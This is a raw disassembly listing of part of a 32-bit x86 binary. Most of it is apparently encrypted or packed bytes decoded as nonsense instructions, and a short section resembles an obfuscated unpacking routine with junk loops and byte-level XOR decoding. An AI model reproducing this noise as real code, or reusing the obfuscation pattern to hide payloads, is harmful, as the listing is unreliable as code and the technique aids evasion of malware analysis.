  406a10:	sbb    eax,0x6060650e
  406a15:	std    
  406a16:	push   ss
  406a17:	dec    esi
  406a18:	pop    edi
  406a19:	pop    es
  406a1a:	popf   
  406a1b:	dec    ebx
  406a1c:	pop    ebx
  406a1d:	(bad)  
  406a1e:	into   
  406a1f:	sub    ebp,ebx
  406a21:	in     eax,0xfe
  406a23:	aas    
  406a24:	adc    DWORD PTR [edi+0x24],0xb
  406a28:	xor    BYTE PTR [ecx+0x67],ah
  406a2b:	sti    
  406a2c:	scas   al,BYTE PTR es:[edi]
  406a2d:	sbb    edi,DWORD PTR [edx+0x5a]
  406a30:	jae    0x406a74
  406a32:	shr    DWORD PTR [eax+eax*8+0xa],1
  406a36:	add    ecx,DWORD PTR [ebx]
  406a38:	lock cld 
  406a3a:	imul   esp,edi,0x8c1cebc9
  406a40:	sbb    al,BYTE PTR [ecx-0x2c]
  406a43:	adc    ecx,DWORD PTR [eax-0x7f9372e3]
  406a49:	and    eax,0x3c87c1d8
  406a4e:	add    DWORD PTR [edx-0x65bcf21b],eax
  406a54:	mov    esi,0x1237b2be
  406a59:	pop    ecx
  406a5a:	sub    DWORD PTR [ebp-0x315e2041],esi
  406a60:	push   cs
  406a61:	test   bh,cl
  406a63:	cld    
  406a64:	iret   
  406a65:	adc    al,0x29
  406a67:	faddp  st(3),st
  406a69:	popa   
  406a6a:	mov    cl,0xc
  406a6c:	mov    BYTE PTR [ecx+0x24aa98b2],al
  406a72:	inc    eax
  406a73:	adc    al,0xb7
  406a75:	ret    0xc55b
  406a78:	cmp    BYTE PTR [esi-0x6c],dl
  406a7b:	pop    ds
  406a7c:	call   0xc3f7:0xbcd8c571
  406a83:	mov    esi,0x30da0654
  406a88:	push   0x41
  406a8a:	add    al,0xcb
  406a8c:	mov    ah,BYTE PTR [ecx-0x6dbbb6b4]
  406a92:	push   edx
  406a93:	out    dx,eax
  406a94:	(bad)  
  406a95:	jno    0x406aae
  406a97:	shl    BYTE PTR [eax+0x1e],0x6e
  406a9b:	enter  0xe28c,0xe3
  406a9f:	int3   
  406aa0:	lds    esp,FWORD PTR [ecx-0x1af86c1c]
  406aa6:	imul   esi,DWORD PTR [edi-0x40],0xffffff9e
  406aaa:	sub    BYTE PTR ds:0x51e8d9f0,cl
  406ab0:	mov    bh,0xe4
  406ab2:	sahf   
  406ab3:	call   0x8a5f:0xf3d1fa8f
  406aba:	inc    eax
  406abb:	xchg   ecx,eax
  406abc:	jno    0x406a62
  406abe:	je     0x406b02
  406ac0:	(bad)  
  406ac1:	loop   0x406b01
  406ac3:	sub    eax,0xaf529ade
  406ac8:	push   ds
  406ac9:	dec    esp
  406aca:	and    edi,0x21600101
  406ad0:	cmc    
  406ad1:	mov    dh,0xdb
  406ad3:	std    
  406ad4:	and    BYTE PTR [edx-0x191a88af],0x24
  406adb:	pop    esi
  406adc:	rcr    BYTE PTR [eax+0x4b8de96e],0xf9
  406ae3:	mov    esi,0x316482c9
  406ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ae9:	mov    esi,0xaea42fb7
  406aee:	in     eax,0xd5
  406af0:	fnstsw WORD PTR [edx+0x6447bc03]
  406af6:	ins    DWORD PTR es:[edi],dx
  406af7:	jmp    0x28c:0x358269d6
  406afe:	call   0x299d:0x87f0e9d3
  406b05:	mov    ch,0x4a
  406b07:	das    
  406b08:	(bad)  
  406b09:	mov    al,ds:0x39cc27ab
  406b0e:	call   0x67f1:0x96a41139
  406b15:	or     esp,DWORD PTR [esi-0x4]
  406b18:	sbb    ebx,DWORD PTR [edi-0x3e268052]
  406b1e:	push   0xfffffff9
  406b20:	or     bl,bl
  406b22:	pop    esp
  406b23:	shl    dh,0x69
  406b26:	inc    ecx
  406b27:	es std 
  406b29:	and    DWORD PTR [edx],ebp
  406b2b:	sbb    al,0xbe
  406b2d:	and    al,0x8b
  406b2f:	push   0x41ed271b
  406b34:	les    esi,FWORD PTR [eax+0x14c734bc]
  406b3a:	es es mov edx,0x52540a5b
  406b41:	aam    0x7
  406b43:	test   eax,0xbac5bd68
  406b48:	mov    dh,cl
  406b4a:	std    
  406b4b:	fwait
  406b4c:	xchg   ebx,eax
  406b4d:	nop
  406b4e:	jmp    0x406bce
  406b50:	fsub   QWORD PTR [esi]
  406b52:	jne    0x406b83
  406b54:	xchg   ecx,eax
  406b55:	inc    ebp
  406b56:	sbb    eax,0x9a9deb59
  406b5b:	outs   dx,BYTE PTR ds:[esi]
  406b5c:	mov    esp,0x541345ed
  406b61:	es pop ecx
  406b63:	popa   
  406b64:	data16 jbe 0x406b09
  406b67:	dec    edi
  406b68:	fld    DWORD PTR [ebx]
  406b6a:	aas    
  406b6b:	jne    0x406b5d
  406b6d:	cld    
  406b6e:	mov    ds:0xeea4e29d,al
  406b73:	stos   DWORD PTR es:[edi],eax
  406b74:	jnp    0x406be3
  406b76:	xor    al,0x7d
  406b78:	std    
  406b79:	aad    0xc5
  406b7b:	in     al,0x5b
  406b7d:	ja     0x406b9b
  406b7f:	dec    ecx
  406b80:	and    BYTE PTR [eax],0xd1
  406b83:	je     0x406b94
  406b85:	test   BYTE PTR [edi],al
  406b87:	sar    DWORD PTR [edx],0x3e
  406b8a:	mov    edx,DWORD PTR [eax-0x2e77d2f9]
  406b90:	xor    BYTE PTR [edx],0xb7
  406b93:	ins    DWORD PTR es:[edi],dx
  406b94:	sub    BYTE PTR [ecx+0x4f],al
  406b97:	(bad)  
  406b98:	int    0xaf
  406b9a:	scas   eax,DWORD PTR es:[edi]
  406b9b:	imul   ebp,DWORD PTR [edx-0x71],0x61
  406b9f:	dec    edx
  406ba0:	inc    ebp
  406ba1:	sub    al,0xd
  406ba3:	dec    edi
  406ba4:	mov    eax,ds:0x8cf8866
  406ba9:	sti    
  406baa:	gs mov esp,0x7ca8e30a
  406bb0:	adc    DWORD PTR [esi],0x6fd21584
  406bb6:	cli    
  406bb7:	jne    0x406b43
  406bb9:	out    dx,eax
  406bba:	ficom  WORD PTR [edi+eax*1-0xbcaef06]
  406bc1:	(bad)  
  406bc2:	(bad)  
  406bc3:	sub    BYTE PTR [eax],al
  406bc5:	ins    BYTE PTR es:[edi],dx
  406bc6:	sbb    bh,BYTE PTR [eax+0x3f]
  406bc9:	dec    ebp
  406bca:	mov    esi,0x4027516d
  406bcf:	inc    esi
  406bd0:	test   al,0x51
  406bd2:	je     0x406c15
  406bd4:	sbb    al,0x42
  406bd6:	mov    edx,0xcffe5d84
  406bdb:	pop    es
  406bdc:	xchg   esi,eax
  406bdd:	inc    ebp
  406bde:	adc    al,0x95
  406be0:	push   ebx
  406be1:	and    DWORD PTR [esi-0x70],edi
  406be4:	mov    ecx,0x602828dd
  406be9:	or     DWORD PTR [edx-0x64],esi
  406bec:	or     eax,0xf34f58e3
  406bf1:	or     bh,BYTE PTR [edx-0x79]
  406bf4:	push   cs
  406bf5:	cmp    DWORD PTR [ebx-0x254e035],edx
  406bfb:	es mov esi,0xba4a9067
  406c01:	sub    bl,BYTE PTR [eax+0x5f]
  406c04:	(bad)
  406c08:	dec    eax
  406c09:	fiadd  WORD PTR [esi+0x2224a3b5]
  406c0f:	inc    ecx
  406c10:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  406c16:	jmp    0x406fa0
  406c1b:	repz into 
  406c1d:	inc    ebx
  406c1e:	or     eax,DWORD PTR [ebx-0x75]
  406c21:	pop    ebx
  406c22:	inc    esi
  406c23:	and    al,0xdd
  406c25:	sub    BYTE PTR [edi],bh
  406c27:	stos   DWORD PTR es:[edi],eax
  406c28:	jbe    0x406c98
  406c2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c2b:	cmp    dl,cl
  406c2d:	jle    0x406cad
  406c2f:	jmp    0x406ca2
  406c31:	jle    0x406cb1
  406c33:	sbb    ebx,edx
  406c35:	pop    ss
  406c36:	not    esi
  406c38:	mov    ch,0x64
  406c3a:	mov    bl,BYTE PTR ds:0xc81da988
  406c40:	or     BYTE PTR [esp+ecx*1],ch
  406c43:	leave  
  406c44:	jbe    0x406c3e
  406c46:	mul    BYTE PTR [ecx]
  406c48:	(bad)  
  406c49:	adc    ah,BYTE PTR [edx+0x44]
  406c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4d:	cdq    
  406c4e:	stc    
  406c4f:	dec    ecx
  406c50:	pop    eax
  406c51:	inc    esi
  406c52:	push   0xffffffdf
  406c54:	or     ebp,esp
  406c56:	pop    ebx
  406c57:	mov    al,ds:0xc0cacc73
  406c5c:	adc    eax,0x74b29767
  406c62:	outs   dx,DWORD PTR ds:[si]
  406c64:	push   0x3d
  406c66:	and    eax,0x9d01e9a6
  406c6b:	xchg   esp,eax
  406c6c:	ds (bad) 
  406c6e:	nop
  406c6f:	pop    ecx
  406c70:	jecxz  0x406c05
  406c72:	rcr    DWORD PTR [edx-0x14],0x65
  406c76:	(bad)
  406c7a:	test   edx,ebx
  406c7c:	mov    ecx,0x8bbd2c38
  406c81:	jp     0x406c6c
  406c83:	out    dx,eax
  406c84:	xchg   ebx,eax
  406c85:	or     edx,DWORD PTR [eax-0x5e]
  406c88:	add    eax,0xc9a96077
  406c8d:	icebp  
  406c8e:	adc    al,0x89
  406c90:	fistp  WORD PTR [ebp+0x2c3d1e98]
  406c96:	xor    eax,0x19964870
  406c9b:	ins    DWORD PTR es:[edi],dx
  406c9c:	push   cs
  406c9d:	ja     0x406c50
  406c9f:	mov    ds:0xe56994b6,eax
  406ca4:	(bad)  
  406ca6:	in     eax,0x69
  406ca8:	into   
  406ca9:	push   ecx
  406caa:	push   ss
  406cab:	mul    DWORD PTR [ecx+0x64684d6c]
  406cb1:	push   ebp
  406cb2:	add    al,BYTE PTR [ebp+0x59]
  406cb5:	iret   
  406cb6:	lds    esi,FWORD PTR ds:0xa4a83a89
  406cbc:	mov    edx,0x39b6c6d5
  406cc1:	dec    esi
  406cc2:	mov    dh,0x8e
  406cc4:	repnz fild QWORD PTR [edx+0x37]
  406cc8:	xchg   edi,eax
  406cc9:	test   BYTE PTR [edx],bh
  406ccb:	hlt    
  406ccc:	sub    DWORD PTR [esi-0x339057e4],edx
  406cd2:	and    ebp,0xb06f126c
  406cd8:	ins    BYTE PTR es:[edi],dx
  406cd9:	in     al,0xa0
  406cdb:	popa   
  406cdc:	sbb    al,BYTE PTR [ebp+0x45]
  406cdf:	fdivr  QWORD PTR [ecx+0x3c67554c]
  406ce5:	adc    bl,BYTE PTR [edx-0x5820114b]
  406ceb:	add    BYTE PTR [esi],ch
  406ced:	stos   DWORD PTR es:[edi],eax
  406cee:	mov    edx,0xd093d37e
  406cf3:	call   0xb7b9bd0b
  406cf8:	and    DWORD PTR [edx-0x27],ebp
  406cfb:	emms   
  406cfd:	(bad)  
  406cfe:	out    dx,al
  406cff:	fld    QWORD PTR [edx-0x7c29f184]
  406d05:	arpl   WORD PTR [esi+ebx*8+0x22],ax
  406d09:	jno    0x406cfc
  406d0b:	or     al,BYTE PTR [edi]
  406d0d:	pop    edi
  406d0e:	pop    ds
  406d0f:	addr16 std 
  406d11:	sbb    dl,BYTE PTR [ecx-0x1212e1c8]
  406d17:	or     eax,DWORD PTR [esi]
  406d19:	jp     0x406d2e
  406d1b:	std    
  406d1c:	pop    ecx
  406d1d:	adc    al,0x8a
  406d1f:	or     DWORD PTR [edi],esi
  406d21:	pop    edi
  406d22:	mov    esi,0x7788e914
  406d27:	add    eax,DWORD PTR [esi]
  406d29:	cld    
  406d2a:	sub    BYTE PTR [ebx+ebp*2+0x6c86ca34],dh
  406d31:	daa    
  406d32:	sbb    al,0x4c
  406d34:	mov    bh,0x16
  406d36:	cmp    DWORD PTR [ebx-0x1d],0x4ab79be3
  406d3d:	fcomp  QWORD PTR [edi-0x62]
  406d40:	sbb    al,0x2f
  406d42:	sub    eax,0xbe1fae1b
  406d47:	imul   ecx,DWORD PTR [ecx+0x28],0x8cb52d3b
  406d4e:	or     al,0x4b
  406d50:	retf   0x4e97
  406d53:	mov    cl,0x2c
  406d55:	fdiv   DWORD PTR [esi-0x611e6b68]
  406d5b:	cld    
  406d5c:	stos   DWORD PTR es:[edi],eax
  406d5d:	add    eax,0xad497553
  406d62:	inc    esp
  406d63:	out    0x83,eax
  406d65:	mov    edx,0x359a7730
  406d6a:	dec    eax
  406d6b:	sar    BYTE PTR [edx+0x2968e88c],0x37
  406d72:	jno    0x406d4c
  406d74:	test   eax,0x41ce5211
  406d79:	fstp   QWORD PTR [edi]
  406d7b:	mov    edi,DWORD PTR [eiz*8-0x6b367b1a]
  406d82:	ja     0x406daa
  406d84:	call   0x59c6:0x6e827854
  406d8b:	dec    esi
  406d8c:	sub    cl,dl
  406d8e:	xchg   BYTE PTR [ecx+ecx*1-0x38ef049f],cl
  406d95:	push   edi
  406d96:	jnp    0x406ddc
  406d98:	sbb    esi,DWORD PTR [ecx]
  406d9a:	or     DWORD PTR [edi+0x485bedb4],ebp
  406da0:	test   BYTE PTR [edx-0x1d],0xce
  406da4:	xor    DWORD PTR [esi+0x335e1b4d],esi
  406daa:	ds in  eax,dx
  406dac:	pop    ebp
  406dad:	shr    DWORD PTR [edi],1
  406daf:	mov    edi,0x5b4e41e8
  406db4:	cmp    eax,DWORD PTR [ebp+0x4eda95e6]
  406dba:	sar    ah,0x78
  406dbd:	or     DWORD PTR [edi-0xc95a7ae],0xfffffff0
  406dc4:	cmp    BYTE PTR [eax+0x77ee0be9],cl
  406dca:	dec    esp
  406dcb:	and    eax,0xffde44c9
  406dd0:	rcr    BYTE PTR [ecx+0x56],1
  406dd3:	and    BYTE PTR [eax+edx*4],al
  406dd6:	(bad)  [esi-0x47]
  406dd9:	adc    eax,0x37b29931
  406dde:	jns    0x406e5e
  406de0:	fwait
  406de1:	xor    ebx,DWORD PTR [edi+0x7688f80c]
  406de7:	jb     0x406ddb
  406de9:	jge    0x406e03
  406deb:	inc    DWORD PTR [edi-0x53b3dfa8]
  406df1:	jae    0x406da2
  406df3:	push   ecx
  406df4:	inc    esp
  406df5:	sbb    DWORD PTR [edi],0xffffffc7
  406df8:	add    DWORD PTR [edx],eax
  406dfa:	dec    esp
  406dfb:	add    al,BYTE PTR [eax]
  406dfd:	or     eax,0x2c4dca0c
  406e02:	fcomip st,st(0)
  406e04:	adc    eax,0xdec93f25
  406e09:	and    ecx,DWORD PTR [ecx+eax*4-0x16]
  406e0d:	xchg   ecx,eax
  406e0e:	push   esp
  406e0f:	mov    eax,0xe88681e6
  406e14:	jmp    0x490d29cc
  406e19:	adc    BYTE PTR [ebx+0x3b9e6f9f],bh
  406e1f:	xchg   DWORD PTR [edx],eax
  406e21:	ret    
  406e22:	test   al,0xf2
  406e24:	outs   dx,BYTE PTR ds:[esi]
  406e25:	push   ds
  406e26:	mov    dh,ah
  406e28:	enter  0xfb04,0xad
  406e2c:	mov    al,ah
  406e2e:	jns    0x406e3a
  406e30:	xchg   edx,eax
  406e31:	and    edi,DWORD PTR [esp+edi*8+0x6b]
  406e35:	out    dx,al
  406e36:	mov    cl,0x25
  406e38:	jae    0x406e7c
  406e3a:	xor    ah,bl
  406e3c:	mov    esi,0x27627b2c
  406e41:	sub    ebp,edi
  406e43:	jge    0x406e64
  406e45:	sub    al,0x6f
  406e47:	lea    ebx,[esi-0x37f78151]
  406e4d:	shl    BYTE PTR [edx-0x213fb970],1
  406e53:	lods   al,BYTE PTR ds:[esi]
  406e54:	rcr    DWORD PTR fs:[edi+0x42],1
  406e58:	mov    bh,0x8
  406e5a:	lahf   
  406e5b:	mov    eax,0xebe4269f
  406e60:	xor    eax,0xb24198e9
  406e65:	cmp    al,0xf9
  406e67:	fwait
  406e68:	out    0xa,eax
  406e6a:	arpl   WORD PTR [edx+0x119907d8],si
  406e70:	aam    0xd2
  406e72:	sbb    ch,BYTE PTR [eax+0x19]
  406e75:	out    0xe0,al
  406e77:	ficomp WORD PTR ss:[ebx]
  406e7a:	xor    al,0xc1
  406e7c:	inc    edi
  406e7d:	and    esp,DWORD PTR [ebx+ebp*2]
  406e80:	out    dx,eax
  406e81:	mov    DWORD PTR [ecx],eax
  406e83:	outs   dx,DWORD PTR ds:[esi]
  406e84:	add    eax,0x5effc939
  406e89:	sub    eax,0xf6fc7663
  406e8e:	repnz mov ds:0x56d85586,eax
  406e94:	mov    al,ds:0x6bb0dc0b
  406e99:	aaa    
  406e9a:	cmp    al,BYTE PTR [ebx-0x25059a6]
  406ea0:	mov    esi,0x8272a8a
  406ea5:	jmp    0xe2e6:0x7e371253
  406eac:	lods   al,BYTE PTR ds:[esi]
  406ead:	cmp    eax,0xeff58ab7
  406eb2:	sub    ebx,DWORD PTR [esp+eax*4]
  406eb5:	data16 adc al,0x18
  406eb8:	in     al,dx
  406eb9:	xor    DWORD PTR [eax-0x844baa4],ebx
  406ebf:	dec    esp
  406ec0:	add    al,ch
  406ec2:	pop    ecx
  406ec3:	stc    
  406ec4:	fnsave [ebx]
  406ec6:	fist   DWORD PTR [ebp+0x6215814]
  406ecc:	shl    esi,cl
  406ece:	scas   al,BYTE PTR es:[edi]
  406ecf:	mov    DWORD PTR [ebx+ebp*8-0x41],edx
  406ed3:	jb     0x406eb8
  406ed5:	scas   al,BYTE PTR es:[edi]
  406ed6:	repz adc al,0xc2
  406ed9:	dec    ecx
  406eda:	scas   eax,DWORD PTR es:[edi]
  406edb:	imul   BYTE PTR ds:0x72999caf
  406ee1:	fist   DWORD PTR [ecx-0x4a221e74]
  406ee7:	dec    ecx
  406ee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee9:	sbb    BYTE PTR [ebx-0x9],0x11
  406eed:	lea    eax,[edi]
  406eef:	imul   esp,DWORD PTR [ebx+esi*2],0xec7e071c
  406ef6:	mov    esp,0xceee0dc2
  406efb:	pop    eax
  406efc:	sbb    al,0x36
  406efe:	mov    al,ds:0x3bb22094
  406f03:	pop    ds
  406f04:	cwde   
  406f05:	aam    0xb
  406f07:	xchg   esi,eax
  406f08:	xchg   DWORD PTR [ebx+0x3e],ebx
  406f0b:	imul   esi,esp,0x881df800
  406f11:	or     eax,0xdfa7fac0
  406f16:	adc    al,0x19
  406f18:	gs shl edi,cl
  406f1b:	bound  edx,QWORD PTR [eax-0x469586f1]
  406f21:	add    ebx,ebp
  406f23:	push   ds
  406f24:	add    bh,BYTE PTR [esi-0x1101a521]
  406f2a:	mov    edi,?
  406f2c:	div    BYTE PTR [edi-0x78]
  406f2f:	adc    al,0xe6
  406f31:	fisub  DWORD PTR [edi-0x2b]
  406f34:	push   cs
  406f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f36:	sbb    DWORD PTR [ebx+0x17],edi
  406f39:	retf   0x7a52
  406f3c:	sbb    edx,DWORD PTR [ebx]
  406f3e:	jp     0x406efe
  406f40:	outs   dx,BYTE PTR ds:[esi]
  406f41:	ins    BYTE PTR es:[edi],dx
  406f42:	push   esi
  406f43:	std    
  406f44:	dec    esi
  406f45:	push   0xe6620fb3
  406f4a:	mov    ch,0x78
  406f4c:	sbb    BYTE PTR [ebx-0x15f3df5d],cl
  406f52:	sub    eax,DWORD PTR [ecx]
  406f54:	stc    
  406f55:	mov    BYTE PTR [esi+ebx*1],al
  406f58:	test   eax,0x788ee2ef
  406f5d:	jl     0x406fc7
  406f5f:	lea    esi,[ecx-0x5f1b3d26]
  406f65:	(bad)  
  406f66:	jne    0x406f59
  406f68:	int3   
  406f69:	pop    eax
  406f6a:	daa    
  406f6b:	mov    ebx,0xb6f0e2ec
  406f70:	push   ss
  406f71:	(bad)  [ebp+0x5c]
  406f74:	in     eax,0x7c
  406f76:	je     0x406f0f
  406f78:	ficom  WORD PTR [esp+edi*1]
  406f7b:	(bad)  
  406f7c:	gs xor eax,0x3a5edc07
  406f82:	ins    BYTE PTR es:[edi],dx
  406f83:	in     al,dx
  406f84:	push   esi
  406f85:	pop    edx
  406f86:	fstp   TBYTE PTR [ebx]
  406f88:	or     al,0x2b
  406f8a:	inc    edx
  406f8b:	mov    ebp,0x79c3e8da
  406f90:	sub    cl,BYTE PTR gs:[edx+0x1d5dd3a3]
  406f97:	lock jns 0x406f97
  406f9a:	call   0x77ab26cd
  406f9f:	popa   
  406fa0:	add    eax,edx
  406fa2:	mov    ds:0x41222c,eax
  406fa7:	jmp    0x406fb6
  406fac:	mov    eax,ds:0x41222c
  406fb1:	mov    ds:0x412224,eax
  406fb6:	mov    eax,DWORD PTR [ebp+0x8]
  406fb9:	mov    eax,DWORD PTR [eax]
  406fbb:	mov    ecx,DWORD PTR ds:0x412224
  406fc1:	add    DWORD PTR [eax],ecx
  406fc3:	pop    esi
  406fc4:	pop    ebp
  406fc5:	ret    0x8
  406fc8:	push   ebp
  406fc9:	mov    ebp,esp
  406fcb:	sub    esp,0x58
  406fce:	mov    DWORD PTR ds:0x430496,0x19
  406fd8:	cmp    DWORD PTR ds:0x430496,0x0
  406fdf:	je     0x407029
  406fe5:	cmp    DWORD PTR ds:0x430496,0x8
  406fec:	jne    0x406ffd
  406ff2:	push   0x89da
  406ff7:	call   DWORD PTR ds:0x42eac4
  406ffd:	cmp    DWORD PTR ds:0x430496,0x9
  407004:	jne    0x407017
  40700a:	mov    ecx,DWORD PTR ds:0x430496
  407010:	dec    ecx
  407011:	mov    DWORD PTR ds:0x430496,ecx
  407017:	mov    ecx,DWORD PTR ds:0x430496
  40701d:	dec    ecx
  40701e:	mov    DWORD PTR ds:0x430496,ecx
  407024:	jmp    0x406fd8
  407029:	mov    ecx,DWORD PTR [ebp+0x8]
  40702c:	mov    eax,0x8a40
  407031:	xor    ax,WORD PTR [ecx+0x20]
  407035:	sbb    DWORD PTR ds:0x430556,edi
  40703b:	mov    ecx,0x3b06
  407040:	xor    DWORD PTR ds:0x43054a,0x33da
  40704a:	add    ax,cx
  40704d:	add    DWORD PTR ds:0x42ee18,0x42ee20
  407057:	movzx  eax,ax
  40705a:	mov    DWORD PTR [ebp-0xc],eax
  40705d:	xor    DWORD PTR ds:0x42ee10,edi
  407063:	mov    BYTE PTR [ebp-0x1],0x7f
  407067:	lea    eax,[ebp-0x1]
  40706a:	and    DWORD PTR ds:0x42ee1c,0x0
  407074:	xor    ecx,ecx
  407076:	or     ecx,DWORD PTR ds:0x42ee1c
  40707c:	inc    ecx
  40707d:	mov    DWORD PTR ds:0x42ee1c,ecx
  407083:	cmp    DWORD PTR ds:0x42ee1c,0x4
  40708a:	jne    0x4070a9
  407090:	push   0x5988
  407095:	push   DWORD PTR [ebp-0x28]
  407098:	push   DWORD PTR [ebp-0x24]
  40709b:	push   0x2877
  4070a0:	push   DWORD PTR [ebp-0x1c]
  4070a3:	call   DWORD PTR ds:0x42eba4
  4070a9:	cmp    DWORD PTR ds:0x42ee1c,0x3
  4070b0:	jne    0x4070c3
  4070b6:	mov    ecx,DWORD PTR ds:0x42ee1c
  4070bc:	inc    ecx
  4070bd:	mov    DWORD PTR ds:0x42ee1c,ecx
  4070c3:	cmp    DWORD PTR ds:0x42ee1c,0x11
  4070ca:	jb     0x407074
  4070d0:	sub    ecx,0x27d8
  4070d6:	mov    DWORD PTR [ebp-0x10],eax
  4070d9:	adc    DWORD PTR ds:0x43055a,edx
  4070df:	mov    al,BYTE PTR [ebp-0x1]
  4070e2:	and    DWORD PTR ds:0x42ee28,0x0
  4070ec:	jmp    0x4070fe
  4070f1:	mov    ecx,DWORD PTR ds:0x42ee28
  4070f7:	inc    ecx
  4070f8:	mov    DWORD PTR ds:0x42ee28,ecx
  4070fe:	cmp    DWORD PTR ds:0x42ee28,0x10
  407105:	jae    0x40712e
  40710b:	cmp    DWORD PTR ds:0x42ee28,0x18
  407112:	jne    0x407129
  407118:	push   DWORD PTR [ebp-0x14]
  40711b:	push   DWORD PTR [ebp-0x28]
  40711e:	push   0x42ee24
  407123:	call   DWORD PTR ds:0x42eba8
  407129:	jmp    0x4070f1
  40712e:	mov    ecx,DWORD PTR [ebp-0x10]
  407131:	xor    al,0x48
  407133:	sub    al,0x36
  407135:	neg    DWORD PTR ds:0x4304ba
  40713b:	mov    BYTE PTR [ecx],al
  40713d:	mov    DWORD PTR ds:0x430492,0x17
  407147:	cmp    DWORD PTR ds:0x430492,0x0
  40714e:	je     0x407184
  407154:	cmp    DWORD PTR ds:0x430492,0x27
  40715b:	jne    0x407171
  407161:	push   0x22e8
  407166:	push   0x2f8a
  40716b:	call   DWORD PTR ds:0x42ea04
  407171:	xor    eax,eax
  407173:	xor    eax,DWORD PTR ds:0x430492
  407179:	dec    eax
  40717a:	mov    ds:0x430492,eax
  40717f:	jmp    0x407147
  407184:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40718b:	add    ecx,ecx
  40718d:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  407194:	jmp    0x407315
  407199:	rcl    BYTE PTR [esi+0x4979b0d1],0x61
  4071a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071a1:	js     0x40714a
  4071a3:	pop    esi
  4071a4:	mov    esi,0xde382c02
  4071a9:	xchg   ebp,eax
  4071aa:	int    0x7e
  4071ac:	jle    0x407180
  4071ae:	jg     0x40722e
  4071b0:	jle    0x407228
  4071b2:	xor    ch,BYTE PTR [eax+edi*1+0x17]
  4071b6:	rcr    bl,cl
  4071b8:	stos   BYTE PTR es:[edi],al
  4071b9:	and    BYTE PTR [edx],bl
  4071bb:	hlt    
  4071bc:	mov    eax,0xe71c7574
  4071c1:	inc    ebx
  4071c2:	xlat   BYTE PTR ds:[ebx]
  4071c3:	lock sbb dl,ah
  4071c6:	sbb    eax,0x74e654a9
  4071cb:	adc    eax,0xf1921722
  4071d0:	cdq    
  4071d1:	jmp    0x4abed688
  4071d6:	push   ss
  4071d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071d8:	xchg   edx,eax
  4071d9:	jnp    0x407254
  4071db:	adc    al,0x7
  4071dd:	out    0x37,eax
  4071df:	push   ss
  4071e0:	adc    ah,BYTE PTR [eax]
  4071e2:	pop    es
  4071e3:	int    0xa2
  4071e5:	jmp    0x6cb7:0x9983cd8e
  4071ec:	(bad)  
  4071ee:	scas   al,BYTE PTR es:[edi]
  4071ef:	aaa    
  4071f0:	push   ss
  4071f1:	inc    ebx
  4071f2:	push   0xcec3e4d9
  4071f7:	pop    esp
  4071f8:	jne    0x407201
  4071fa:	inc    edx
  4071fb:	push   0xffffffef
  4071fd:	add    edi,DWORD PTR ds:0x1231a8e7
  407203:	enter  0x23eb,0xb3
  407207:	das    
  407208:	mov    gs,eax
  40720a:	ror    cl,cl
  40720c:	pop    es
  40720d:	push   ds
  40720e:	mov    dl,0x6
  407210:	cmp    bl,0xd4
  407213:	pop    edi
  407214:	loopne 0x40725c
  407216:	cmp    BYTE PTR [ebx+0xf],bh
  407219:	mov    ebx,0xeb7060b3
  40721e:	adc    edi,edx
  407220:	inc    esp
  407221:	enter  0x18bc,0xd1
  407225:	aad    0xbb
  407227:	ret    0x6b0c
  40722a:	add    DWORD PTR [esi],0x72
  40722d:	push   eax
  40722e:	push   ss
  40722f:	std    
  407230:	out    0xda,al
  407232:	mov    dh,0x4a
  407234:	mov    ebx,DWORD PTR [edx+0x7ff4c78]
  40723a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40723b:	ror    eax,cl
  40723d:	xchg   DWORD PTR [ebp+0x1f],ebp
  407240:	jae    0x4071d9
  407242:	jmp    0x407297
  407244:	in     eax,0x42
  407246:	jns    0x40726e
  407248:	fwait
  407249:	xchg   ebp,eax
  40724a:	std    
  40724b:	ja     0x4072b6
  40724d:	mov    esi,ebx
  40724f:	in     al,dx
  407250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407251:	and    al,0xe1
  407253:	push   ecx
  407254:	mov    eax,ds:0x2b9b469c
  407259:	cmp    BYTE PTR ds:0xce303929,cl
  40725f:	jecxz  0x4072db
  407261:	and    BYTE PTR [ebx],dl
  407263:	jmp    0x2108ce77
  407268:	idiv   esp
  40726a:	lods   al,BYTE PTR ds:[esi]
  40726b:	xor    BYTE PTR [edi-0x4f],bh
  40726e:	popa   
  40726f:	dec    ecx
  407270:	test   eax,0xe70878bf
  407275:	mov    dh,0xce
  407277:	sub    eax,0xef0927a8
  40727c:	sti    
  40727d:	xor    bh,BYTE PTR [ecx]
  40727f:	xchg   BYTE PTR [ebx-0x341945da],ah
  407285:	sbb    esp,DWORD PTR [edx]
  407287:	add    edi,esi
  407289:	and    ecx,esi
  40728b:	or     cl,cl
  40728d:	(bad)  
  40728e:	fdivr  QWORD PTR [edx]
  407290:	hlt    
  407291:	pop    edi
  407292:	push   ss
  407293:	mov    DWORD PTR [eax+0x388be932],ecx
  407299:	addr16 (bad) 
  40729b:	arpl   WORD PTR [edi],di
  40729d:	ret    0x3d26
  4072a0:	add    eax,0x3501cf1d
  4072a5:	pop    ebx
  4072a6:	stc    
  4072a7:	lods   al,BYTE PTR ds:[esi]
  4072a8:	iret   
  4072a9:	aad    0x9f
  4072ab:	cli    
  4072ac:	es int 0xb9
  4072af:	ins    BYTE PTR es:[edi],dx
  4072b0:	scas   eax,DWORD PTR es:[edi]
  4072b1:	add    eax,0x1b0efd77
  4072b6:	icebp  
  4072b7:	lods   al,BYTE PTR ds:[esi]
  4072b8:	inc    DWORD PTR [edx]
  4072ba:	in     al,dx
  4072bb:	in     eax,0x2d
  4072bd:	jmp    0xd8c23ae0
  4072c2:	lahf   
  4072c3:	sub    ah,cl
  4072c5:	sub    eax,0xcda773d9
  4072ca:	push   eax
  4072cb:	shl    ebp,1
  4072cd:	into   
  4072ce:	sub    al,0x45
  4072d0:	lea    edx,[edi+eax*2-0x24]
  4072d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
